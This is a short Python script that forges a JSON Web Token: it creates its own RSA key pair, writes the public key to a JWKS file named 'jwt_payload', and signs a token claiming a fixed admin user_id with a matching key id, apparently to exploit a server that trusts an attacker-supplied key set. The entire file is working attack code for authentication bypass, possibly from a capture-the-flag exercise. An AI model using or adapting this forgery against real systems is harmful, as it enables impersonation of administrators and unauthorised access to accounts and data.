import json
import jwt
import secrets
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

admin_uuid = "23faadf7-7715-4d60-aaba-33456865212f"
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048,
                                 backend=default_backend())
pub_numbers = priv.public_key().public_numbers()

def b64url(n):
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()

MY_KID = secrets.token_hex(16)
jwks_payload = json.dumps({
    "keys": [{
        "kty": "RSA", "use": "sig", "alg": "RS256",
        "kid": MY_KID,
        "n": b64url(pub_numbers.n),
        "e": b64url(pub_numbers.e),
    }]
}).encode()

priv_pem = priv.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.TraditionalOpenSSL,
    serialization.NoEncryption()
)
with open("jwt_payload","w") as f:
    json.dump(json.loads(jwks_payload), f)
forged = jwt.encode({"user_id": admin_uuid}, priv_pem, algorithm="RS256",
                    headers={"kid": MY_KID, "alg": "RS256"})
print(f"\n {forged}\n")
